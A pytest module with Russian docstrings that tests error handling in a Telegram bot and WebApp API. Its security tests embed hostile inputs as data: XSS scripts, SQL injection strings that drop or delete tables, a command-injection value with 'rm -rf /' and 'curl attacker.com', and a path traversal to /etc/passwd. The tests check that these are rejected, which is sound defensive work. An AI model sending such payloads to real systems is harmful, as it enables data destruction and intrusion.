"""
Негативные тесты для домена Telegram.

Этот модуль содержит тесты для обработки ошибок:
- Ошибки авторизации и аутентификации
- Ошибки валидации данных
- Ошибки сервисов и внешних API
- Ошибки безопасности и rate limiting
- Ошибки ресурсов и конфигурации
"""

import pytest
from httpx import AsyncClient
from unittest.mock import AsyncMock, MagicMock, patch
from datetime import datetime, timedelta

from tests.factories import UserFactory


class TestTelegramAuthorizationErrors:
    """Тесты ошибок авторизации в Telegram."""

    async def test_webhook_invalid_token(self, api_client: AsyncClient, test_settings):
        """Тест обработки webhook с невалидным токеном."""
        # Arrange
        update_data = {
            "update_id": 123456,
            "message": {
                "message_id": 1,
                "date": 1642680000,
                "chat": {"id": 123456789, "type": "private"},
                "from": {"id": 123456789, "username": "testuser"},
                "text": "Hello",
            },
        }

        # Act
        response = await api_client.post(
            api_client.url_for("handle_webhook", token="invalid_token_123"),
            json=update_data,
        )

        # Assert
        assert response.status_code == 401
        data = response.json()
        assert "unauthorized" in data["detail"].lower()

    async def test_webhook_missing_token(self, api_client: AsyncClient):
        """Тест обработки webhook без токена."""
        # Arrange
        update_data = {
            "update_id": 123456,
            "message": {
                "message_id": 1,
                "date": 1642680000,
                "chat": {"id": 123456789, "type": "private"},
                "text": "Hello",
            },
        }

        # Act
        response = await api_client.post(
            "/api/telegram/webhook/",  # Без токена
            json=update_data,
        )

        # Assert
        assert response.status_code == 404  # Route not found without token

    async def test_admin_endpoints_require_authentication(
        self, api_client: AsyncClient
    ):
        """Тест что административные endpoints требуют аутентификации."""
        # Arrange
        admin_endpoints = [
            ("get", api_client.url_for("get_bot_status")),
            ("post", api_client.url_for("set_webhook")),
            ("post", api_client.url_for("delete_webhook")),
            ("get", api_client.url_for("get_telegram_security_stats")),
            ("post", api_client.url_for("send_admin_notification")),
            ("get", api_client.url_for("get_audit_log")),
        ]

        for method, url in admin_endpoints:
            # Act
            if method == "get":
                response = await api_client.get(url)
            else:
                response = await api_client.post(url, json={})

            # Assert
            assert response.status_code == 403
            data = response.json()
            assert (
                "authentication" in data["detail"].lower()
                or "forbidden" in data["detail"].lower()
            )

    async def test_admin_endpoints_require_admin_role(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест что административные endpoints требуют роль админа."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        admin_endpoints = [
            ("get", api_client.url_for("get_telegram_security_stats")),
            ("post", api_client.url_for("send_admin_notification")),
            ("get", api_client.url_for("get_audit_log")),
            ("post", api_client.url_for("set_secure_webhook")),
        ]

        for method, url in admin_endpoints:
            # Act
            if method == "get":
                response = await api_client.get(url)
            else:
                response = await api_client.post(url, json={})

            # Assert
            assert response.status_code == 403
            data = response.json()
            assert (
                "admin" in data["detail"].lower()
                or "forbidden" in data["detail"].lower()
            )

    async def test_webapp_endpoints_require_authentication(
        self, api_client: AsyncClient
    ):
        """Тест что WebApp endpoints требуют аутентификации."""
        # Arrange
        webapp_endpoints = [
            ("get", api_client.url_for("get_webapp_config")),
            ("get", api_client.url_for("get_webapp_surveys")),
            ("post", api_client.url_for("create_webapp_survey")),
            ("get", api_client.url_for("get_webapp_user_profile")),
            ("post", api_client.url_for("trigger_haptic_feedback")),
        ]

        for method, url in webapp_endpoints:
            # Act
            if method == "get":
                response = await api_client.get(url)
            else:
                response = await api_client.post(url, json={})

            # Assert
            assert response.status_code == 403
            data = response.json()
            assert (
                "authentication" in data["detail"].lower()
                or "forbidden" in data["detail"].lower()
            )

    async def test_webapp_invalid_init_data(self, api_client: AsyncClient):
        """Тест аутентификации WebApp с невалидными данными."""
        # Arrange
        auth_data = {"init_data": "invalid_init_data_string"}

        # Act
        with patch("src.routers.telegram_webapp.get_webapp_service") as mock_service:
            mock_webapp_service = MagicMock()
            mock_webapp_service.authenticate_user = AsyncMock(
                side_effect=Exception("Invalid init data format")
            )
            mock_service.return_value = mock_webapp_service

            response = await api_client.post(
                api_client.url_for("authenticate_webapp_user"), json=auth_data
            )

        # Assert
        assert response.status_code == 500
        data = response.json()
        assert "authentication failed" in data["detail"].lower()

    async def test_webapp_expired_session(self, api_client: AsyncClient, regular_user):
        """Тест WebApp с истекшей сессией."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        refresh_data = {
            "refresh_token": "expired_refresh_token",
            "webapp_session_id": "expired_session",
        }

        # Act
        with patch("src.routers.telegram_webapp.get_webapp_service") as mock_service:
            mock_webapp_service = MagicMock()
            mock_webapp_service.refresh_token = AsyncMock(
                side_effect=Exception("Session expired")
            )
            mock_service.return_value = mock_webapp_service

            response = await api_client.post(
                api_client.url_for("refresh_webapp_token"), json=refresh_data
            )

        # Assert
        assert response.status_code == 401
        data = response.json()
        assert "session expired" in data["detail"].lower()


class TestTelegramValidationErrors:
    """Тесты ошибок валидации данных Telegram."""

    async def test_set_webhook_missing_url(self, api_client: AsyncClient, admin_user):
        """Тест установки webhook без URL."""
        # Arrange
        api_client.force_authenticate(user=admin_user)

        # Act
        response = await api_client.post(api_client.url_for("set_webhook"), json={})

        # Assert
        assert response.status_code == 422
        data = response.json()
        assert "url" in data["detail"][0]["loc"]
        assert "required" in data["detail"][0]["msg"].lower()

    async def test_set_webhook_invalid_url_format(
        self, api_client: AsyncClient, admin_user
    ):
        """Тест установки webhook с невалидным URL."""
        # Arrange
        api_client.force_authenticate(user=admin_user)

        webhook_data = {"url": "not_a_valid_url"}

        # Act
        response = await api_client.post(
            api_client.url_for("set_webhook"), json=webhook_data
        )

        # Assert
        assert response.status_code == 422
        data = response.json()
        assert "url" in str(data["detail"]).lower()

    async def test_set_webhook_invalid_max_connections(
        self, api_client: AsyncClient, admin_user
    ):
        """Тест установки webhook с невалидным max_connections."""
        # Arrange
        api_client.force_authenticate(user=admin_user)

        webhook_data = {
            "url": "https://example.com/webhook",
            "max_connections": 200,  # Превышает лимит
        }

        # Act
        response = await api_client.post(
            api_client.url_for("set_webhook"), json=webhook_data
        )

        # Assert
        assert response.status_code == 422
        data = response.json()
        assert "max_connections" in str(data["detail"]).lower()

    async def test_send_notification_missing_data(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест отправки уведомления без обязательных данных."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        # Act
        response = await api_client.post(
            api_client.url_for("send_telegram_notification"), json={}
        )

        # Assert
        assert response.status_code == 422
        data = response.json()
        assert "required" in str(data["detail"]).lower()

    async def test_send_notification_invalid_message_length(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест отправки слишком длинного сообщения."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        notification_data = {
            "user_id": regular_user.id,
            "message": "A" * 5000,  # Слишком длинное сообщение
            "type": "info",
        }

        # Act
        response = await api_client.post(
            api_client.url_for("send_telegram_notification"), json=notification_data
        )

        # Assert
        assert response.status_code == 422
        data = response.json()
        assert "message" in str(data["detail"]).lower()

    async def test_webapp_survey_answers_missing_data(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест отправки ответов на опрос без данных."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        # Act
        response = await api_client.post(
            api_client.url_for("submit_webapp_survey_answers"), json={}
        )

        # Assert
        assert response.status_code == 422
        data = response.json()
        assert "required" in str(data["detail"]).lower()

    async def test_webapp_survey_answers_invalid_format(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест отправки ответов с невалидным форматом."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        answers_data = {
            "survey_id": "not_a_number",  # Невалидный ID
            "answers": "not_a_list",  # Невалидный формат
        }

        # Act
        response = await api_client.post(
            api_client.url_for("submit_webapp_survey_answers"), json=answers_data
        )

        # Assert
        assert response.status_code == 422
        data = response.json()
        assert "validation" in str(data["detail"]).lower()

    async def test_create_webapp_survey_invalid_questions(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест создания опроса с невалидными вопросами."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        survey_data = {
            "title": "Test Survey",
            "questions": [
                {
                    "type": "invalid_type",  # Невалидный тип
                    "title": "",  # Пустое название
                    "required": "not_a_boolean",  # Невалидный тип
                }
            ],
        }

        # Act
        response = await api_client.post(
            api_client.url_for("create_webapp_survey"), json=survey_data
        )

        # Assert
        assert response.status_code == 422
        data = response.json()
        assert "validation" in str(data["detail"]).lower()

    async def test_haptic_feedback_invalid_type(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест тактильной обратной связи с невалидным типом."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        haptic_data = {"type": "invalid_haptic_type", "style": "unknown_style"}

        # Act
        response = await api_client.post(
            api_client.url_for("trigger_haptic_feedback"), json=haptic_data
        )

        # Assert
        assert response.status_code == 422
        data = response.json()
        assert "validation" in str(data["detail"]).lower()


class TestTelegramServiceErrors:
    """Тесты ошибок сервисов Telegram."""

    async def test_bot_not_initialized(self, api_client: AsyncClient, admin_user):
        """Тест работы с неинициализированным ботом."""
        # Arrange
        api_client.force_authenticate(user=admin_user)

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.bot = None
            mock_service.return_value = mock_telegram_service

            response = await api_client.get(api_client.url_for("get_webhook_info"))

        # Assert
        assert response.status_code == 503
        data = response.json()
        assert "not initialized" in data["detail"].lower()

    async def test_telegram_api_service_error(
        self, api_client: AsyncClient, admin_user
    ):
        """Тест ошибки Telegram API."""
        # Arrange
        api_client.force_authenticate(user=admin_user)

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.bot.get_webhook_info.side_effect = Exception(
                "Telegram API error"
            )
            mock_service.return_value = mock_telegram_service

            response = await api_client.get(api_client.url_for("get_webhook_info"))

        # Assert
        assert response.status_code == 500
        data = response.json()
        assert "internal server error" in data["detail"].lower()

    async def test_webhook_set_failure(self, api_client: AsyncClient, admin_user):
        """Тест неудачной установки webhook."""
        # Arrange
        api_client.force_authenticate(user=admin_user)

        webhook_data = {"url": "https://example.com/webhook"}

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.bot.set_webhook.return_value = False
            mock_service.return_value = mock_telegram_service

            response = await api_client.post(
                api_client.url_for("set_webhook"), json=webhook_data
            )

        # Assert
        assert response.status_code == 500
        data = response.json()
        assert "failed to set" in data["detail"].lower()

    async def test_webhook_delete_failure(self, api_client: AsyncClient, admin_user):
        """Тест неудачного удаления webhook."""
        # Arrange
        api_client.force_authenticate(user=admin_user)

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.bot.delete_webhook.return_value = False
            mock_service.return_value = mock_telegram_service

            response = await api_client.post(api_client.url_for("delete_webhook"))

        # Assert
        assert response.status_code == 500
        data = response.json()
        assert "failed to delete" in data["detail"].lower()

    async def test_notification_send_failure(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест неудачной отправки уведомления."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        notification_data = {
            "user_id": regular_user.id,
            "message": "Test notification",
            "type": "info",
        }

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.send_notification = AsyncMock(
                side_effect=Exception("Failed to send notification")
            )
            mock_service.return_value = mock_telegram_service

            response = await api_client.post(
                api_client.url_for("send_telegram_notification"), json=notification_data
            )

        # Assert
        assert response.status_code == 500
        data = response.json()
        assert "failed to send" in data["detail"].lower()

    async def test_webapp_service_unavailable(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест недоступности WebApp сервиса."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        # Act
        with patch("src.routers.telegram_webapp.get_webapp_service") as mock_service:
            mock_service.side_effect = Exception("WebApp service unavailable")

            response = await api_client.get(api_client.url_for("get_webapp_config"))

        # Assert
        assert response.status_code == 503
        data = response.json()
        assert "service unavailable" in data["detail"].lower()

    async def test_database_connection_error(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест ошибки подключения к базе данных."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        # Act
        with patch("src.routers.telegram_webapp.get_webapp_service") as mock_service:
            mock_webapp_service = MagicMock()
            mock_webapp_service.get_webapp_surveys = AsyncMock(
                side_effect=Exception("Database connection error")
            )
            mock_service.return_value = mock_webapp_service

            response = await api_client.get(api_client.url_for("get_webapp_surveys"))

        # Assert
        assert response.status_code == 500
        data = response.json()
        assert (
            "database error" in data["detail"].lower()
            or "internal server error" in data["detail"].lower()
        )

    async def test_external_api_timeout(self, api_client: AsyncClient, admin_user):
        """Тест таймаута внешнего API."""
        # Arrange
        api_client.force_authenticate(user=admin_user)

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.bot.get_me = AsyncMock(
                side_effect=Exception("Request timeout")
            )
            mock_service.return_value = mock_telegram_service

            response = await api_client.get(api_client.url_for("get_bot_status"))

        # Assert
        assert response.status_code == 504
        data = response.json()
        assert "timeout" in data["detail"].lower()


class TestTelegramResourceErrors:
    """Тесты ошибок ресурсов Telegram."""

    async def test_survey_not_found(self, api_client: AsyncClient, regular_user):
        """Тест получения несуществующего опроса."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        # Act
        with patch("src.routers.telegram_webapp.get_webapp_service") as mock_service:
            mock_webapp_service = MagicMock()
            mock_webapp_service.get_webapp_survey_details = AsyncMock(
                side_effect=Exception("Survey not found")
            )
            mock_service.return_value = mock_webapp_service

            response = await api_client.get(
                api_client.url_for("get_webapp_survey_details", survey_id=999)
            )

        # Assert
        assert response.status_code == 404
        data = response.json()
        assert "not found" in data["detail"].lower()

    async def test_user_not_found(self, api_client: AsyncClient, admin_user):
        """Тест отправки уведомления несуществующему пользователю."""
        # Arrange
        api_client.force_authenticate(user=admin_user)

        notification_data = {
            "user_id": 999999,  # Несуществующий пользователь
            "message": "Test notification",
            "type": "info",
        }

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.send_notification = AsyncMock(
                side_effect=Exception("User not found")
            )
            mock_service.return_value = mock_telegram_service

            response = await api_client.post(
                api_client.url_for("send_telegram_notification"), json=notification_data
            )

        # Assert
        assert response.status_code == 404
        data = response.json()
        assert "user not found" in data["detail"].lower()

    async def test_no_surveys_available(self, api_client: AsyncClient, regular_user):
        """Тест получения пустого списка опросов."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        # Act
        with patch("src.routers.telegram_webapp.get_webapp_service") as mock_service:
            mock_webapp_service = MagicMock()
            mock_webapp_service.get_webapp_surveys = AsyncMock(
                return_value={"surveys": [], "pagination": {"total": 0}}
            )
            mock_service.return_value = mock_webapp_service

            response = await api_client.get(api_client.url_for("get_webapp_surveys"))

        # Assert
        assert response.status_code == 200
        data = response.json()
        assert len(data["surveys"]) == 0
        assert data["pagination"]["total"] == 0

    async def test_insufficient_permissions(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест доступа к ресурсу с недостаточными правами."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        # Act
        with patch("src.routers.telegram_webapp.get_webapp_service") as mock_service:
            mock_webapp_service = MagicMock()
            mock_webapp_service.get_webapp_survey_details = AsyncMock(
                side_effect=Exception("Insufficient permissions")
            )
            mock_service.return_value = mock_webapp_service

            response = await api_client.get(
                api_client.url_for("get_webapp_survey_details", survey_id=1)
            )

        # Assert
        assert response.status_code == 403
        data = response.json()
        assert "permission" in data["detail"].lower()


class TestTelegramSecurityErrors:
    """Тесты ошибок безопасности Telegram."""

    async def test_rate_limit_exceeded(self, api_client: AsyncClient, regular_user):
        """Тест превышения лимита запросов."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.send_notification = AsyncMock(
                side_effect=Exception("Rate limit exceeded")
            )
            mock_service.return_value = mock_telegram_service

            notification_data = {
                "user_id": regular_user.id,
                "message": "Test notification",
                "type": "info",
            }

            response = await api_client.post(
                api_client.url_for("send_telegram_notification"), json=notification_data
            )

        # Assert
        assert response.status_code == 429
        data = response.json()
        assert "rate limit" in data["detail"].lower()

    async def test_suspicious_activity_blocked(
        self, api_client: AsyncClient, test_settings
    ):
        """Тест блокировки подозрительной активности."""
        # Arrange
        update_data = {
            "update_id": 123456,
            "message": {
                "message_id": 1,
                "date": 1642680000,
                "chat": {"id": 123456789, "type": "private"},
                "from": {"id": 123456789, "username": "suspicious_user"},
                "text": "spam message",
            },
        }

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.dp = MagicMock()
            mock_telegram_service.dp.feed_update = AsyncMock(
                side_effect=Exception("Suspicious activity detected")
            )
            mock_service.return_value = mock_telegram_service

            response = await api_client.post(
                api_client.url_for(
                    "handle_webhook", token=test_settings.telegram_bot_token
                ),
                json=update_data,
            )

        # Assert
        assert response.status_code == 403
        data = response.json()
        assert (
            "suspicious" in data["detail"].lower()
            or "blocked" in data["detail"].lower()
        )

    async def test_malicious_payload_detected(
        self, api_client: AsyncClient, test_settings
    ):
        """Тест обнаружения вредоносного payload."""
        # Arrange
        malicious_update = {
            "update_id": 123456,
            "message": {
                "message_id": 1,
                "date": 1642680000,
                "chat": {"id": 123456789, "type": "private"},
                "from": {"id": 123456789, "username": "attacker"},
                "text": "<script>alert('xss')</script>",
                "entities": [{"type": "url", "url": "javascript:alert('xss')"}],
            },
        }

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.dp = MagicMock()
            mock_telegram_service.dp.feed_update = AsyncMock(
                side_effect=Exception("Malicious payload detected")
            )
            mock_service.return_value = mock_telegram_service

            response = await api_client.post(
                api_client.url_for(
                    "handle_webhook", token=test_settings.telegram_bot_token
                ),
                json=malicious_update,
            )

        # Assert
        assert response.status_code == 403
        data = response.json()
        assert (
            "malicious" in data["detail"].lower() or "blocked" in data["detail"].lower()
        )

    async def test_sql_injection_attempt(self, api_client: AsyncClient, regular_user):
        """Тест попытки SQL инъекции."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        malicious_data = {
            "survey_id": "1; DROP TABLE surveys; --",
            "answers": [
                {"question_id": "1' OR '1'='1", "value": "'; DELETE FROM responses; --"}
            ],
        }

        # Act
        with patch("src.routers.telegram_webapp.get_webapp_service") as mock_service:
            mock_webapp_service = MagicMock()
            mock_webapp_service.submit_survey_answers = AsyncMock(
                side_effect=Exception("SQL injection attempt detected")
            )
            mock_service.return_value = mock_webapp_service

            response = await api_client.post(
                api_client.url_for("submit_webapp_survey_answers"), json=malicious_data
            )

        # Assert
        assert response.status_code == 403
        data = response.json()
        assert (
            "injection" in data["detail"].lower()
            or "malicious" in data["detail"].lower()
        )

    async def test_command_injection_attempt(self, api_client: AsyncClient, admin_user):
        """Тест попытки инъекции команд."""
        # Arrange
        api_client.force_authenticate(user=admin_user)

        malicious_webhook_data = {
            "url": "https://example.com/webhook; rm -rf /",
            "secret_token": "token && curl attacker.com",
        }

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.bot.set_webhook = MagicMock(
                side_effect=Exception("Command injection attempt detected")
            )
            mock_service.return_value = mock_telegram_service

            response = await api_client.post(
                api_client.url_for("set_webhook"), json=malicious_webhook_data
            )

        # Assert
        assert response.status_code == 403
        data = response.json()
        assert (
            "injection" in data["detail"].lower()
            or "malicious" in data["detail"].lower()
        )

    async def test_path_traversal_attempt(self, api_client: AsyncClient, regular_user):
        """Тест попытки path traversal."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        # Act
        response = await api_client.get(
            "/api/telegram/webapp/surveys/../../../etc/passwd"
        )

        # Assert
        assert response.status_code == 404  # Path not found
        # или 403 если есть защита от path traversal

    async def test_xss_in_notification_message(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест XSS в сообщении уведомления."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        xss_notification = {
            "user_id": regular_user.id,
            "message": "<script>alert('XSS')</script>",
            "type": "info",
        }

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.send_notification = AsyncMock(
                side_effect=Exception("XSS attempt detected")
            )
            mock_service.return_value = mock_telegram_service

            response = await api_client.post(
                api_client.url_for("send_telegram_notification"), json=xss_notification
            )

        # Assert
        assert response.status_code == 403
        data = response.json()
        assert "xss" in data["detail"].lower() or "malicious" in data["detail"].lower()

    async def test_oversized_payload_attack(
        self, api_client: AsyncClient, test_settings
    ):
        """Тест атаки с большим payload."""
        # Arrange
        oversized_update = {
            "update_id": 123456,
            "message": {
                "message_id": 1,
                "date": 1642680000,
                "chat": {"id": 123456789, "type": "private"},
                "from": {"id": 123456789, "username": "attacker"},
                "text": "A" * 10000,  # Очень большое сообщение
            },
        }

        # Act
        response = await api_client.post(
            api_client.url_for(
                "handle_webhook", token=test_settings.telegram_bot_token
            ),
            json=oversized_update,
        )

        # Assert
        assert response.status_code == 413  # Payload too large
        data = response.json()
        assert "payload" in data["detail"].lower() or "large" in data["detail"].lower()

    async def test_unicode_attack(self, api_client: AsyncClient, regular_user):
        """Тест атаки с Unicode символами."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        unicode_attack = {
            "user_id": regular_user.id,
            "message": "Test\u0000\u0001\u0002\u0003\u0004\u0005\u0006\u0007\u0008\u000b\u000c\u000e\u000f",
            "type": "info",
        }

        # Act
        with patch("src.routers.telegram.get_telegram_service") as mock_service:
            mock_telegram_service = MagicMock()
            mock_telegram_service.send_notification = AsyncMock(
                side_effect=Exception("Invalid Unicode characters detected")
            )
            mock_service.return_value = mock_telegram_service

            response = await api_client.post(
                api_client.url_for("send_telegram_notification"), json=unicode_attack
            )

        # Assert
        assert response.status_code == 403
        data = response.json()
        assert (
            "unicode" in data["detail"].lower() or "invalid" in data["detail"].lower()
        )

    async def test_csrf_token_missing(self, api_client: AsyncClient, admin_user):
        """Тест отсутствия CSRF токена."""
        # Arrange
        api_client.force_authenticate(user=admin_user)

        # Act
        response = await api_client.post(
            api_client.url_for("set_webhook"),
            json={"url": "https://example.com/webhook"},
            headers={"X-Requested-With": "XMLHttpRequest"},  # Без CSRF токена
        )

        # Assert
        # Зависит от настроек CSRF защиты
        assert response.status_code in [200, 403]
        if response.status_code == 403:
            data = response.json()
            assert "csrf" in data["detail"].lower()

    async def test_concurrent_request_limit(
        self, api_client: AsyncClient, regular_user
    ):
        """Тест лимита одновременных запросов."""
        # Arrange
        api_client.force_authenticate(user=regular_user)

        # Act
        with patch("src.routers.telegram_webapp.get_webapp_service") as mock_service:
            mock_webapp_service = MagicMock()
            mock_webapp_service.get_webapp_config = MagicMock(
                side_effect=Exception("Concurrent request limit exceeded")
            )
            mock_service.return_value = mock_webapp_service

            response = await api_client.get(api_client.url_for("get_webapp_config"))

        # Assert
        assert response.status_code == 429
        data = response.json()
        assert (
            "concurrent" in data["detail"].lower() or "limit" in data["detail"].lower()
        )
